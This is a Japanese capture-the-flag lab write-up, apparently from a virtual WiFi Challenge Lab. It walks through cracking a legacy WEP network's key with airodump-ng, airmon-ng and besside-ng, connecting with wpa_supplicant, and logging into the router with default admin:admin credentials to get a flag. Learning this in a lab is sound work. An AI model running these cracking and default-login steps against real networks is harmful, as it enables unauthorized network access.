---
title: 4 Legacy
---

# 7. Wi-Fiの古いパスワードを取得する

## WEPの偵察

MACを確認

```zsh
sudo airodump-ng wlan60
```

![[Pasted image 20261116001018.png]]

```
F0:9F:C2:71:22:11
```

CHを確認

```
3
```

type monitorのインターフェースを確認

```zsh
iw dev
```

![[Pasted image 20261117011630.png]]

```zsh
sudo airmon-ng check kill
```

```zsh
sudo besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v
```

![[Pasted image 20261117012047.png]]
![[Pasted image 20261117012106.png]]

```
Got key for wifi-old [11:bb:33:cd:55] 15001 IVs
```

この2つのコマンドは、Wi-Fiの監視・接続環境を整えたうえで、besside-ng を使って指定したアクセスポイントを対象にWPA関連の解析を行う操作です。
1. airmon-ng check kill

```
sudo airmon-ng check kill
```


目的：無線インターフェースと競合するプロセスを停止すること。

主に以下のようなプロセスが対象になります。
- NetworkManager
- wpa_supplicant
- dhclient

これらが無線インターフェースを管理していると、モニターモードやパケットキャプチャと競合する場合があります。

注意点：
- Wi-Fi接続が切断される場合がある
- NetworkManagerなどが停止する場合がある
- 通常、OS再起動で復旧する
2. besside-ng

```
sudo besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v
```

オプション	意味
- -c 3	チャンネル3を指定
- -b	対象BSSIDを指定
- F0:9F:C2:71:22:11	対象アクセスポイントのMACアドレス
- wlan2	使用する無線インターフェース
- -v	詳細出力（Verbose）

besside-ngとは？
Aircrack-ngスイートに含まれる無線LAN監査ツールです。

WEP/WPAネットワークのセキュリティ評価を支援します。
3. 今回の実行で重要なポイント
以前のWiFi Challenge Labの環境では、mac80211_hwsim によって仮想無線インターフェースを作成していました。

ここで注意したいのは、次の3つは別のものだという点です。
- wlan2：無線インターフェース
- wlan2mon：モニターモード用に作成されたインターフェース名の例
- monitor：インターフェースの動作モード
wlan2 が存在していても、モニターモードになっているとは限りません。

確認コマンド：
```
iw dev
```


補足： airmon-ng check kill はプロセスを停止するだけで、モニターモードへの変更そのものではありません。実行後に iw dev で状態を確認してください。

```
network={
  ssid="wifi-old"
  key_mgmt=NONE
  wep_key0=11BB33CD55
  wep_tx_keyidx=0
}
```

![[Pasted image 20261117012643.png]]

```zsh
sudo wpa_supplicant -Dnl80211 -iwlan2 -c wep.conf
```

![[Pasted image 20261117012939.png]]

```zsh
sudo dhclient wlan2 -v
```

![[Pasted image 20261117013052.png]]

![[Pasted image 20261117013157.png]]

![[Pasted image 20261117013316.png]]

admin:admin

![[Pasted image 20261117013609.png]]

```
flag{c342fe657870020a1b164f2075f447564fdd1c3d}
```

---

# 28. What is the flag found on the wifi-event AP?

